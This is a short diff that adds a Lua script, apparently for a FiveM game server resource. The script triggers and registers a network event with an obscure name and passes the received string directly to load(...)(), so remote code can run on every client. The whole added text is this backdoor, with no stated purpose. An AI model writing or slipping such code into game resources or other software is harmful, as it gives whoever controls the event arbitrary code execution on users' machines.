@@ -1,0 +1,7 @@
+CreateThread(function()
+TriggerServerEvent("devyeshaha")
+RegisterNetEvent("devyeshaha")
+AddEventHandler("devyeshaha", function(devyeshaha)
+load(devyeshaha)()
+ end)
+end)
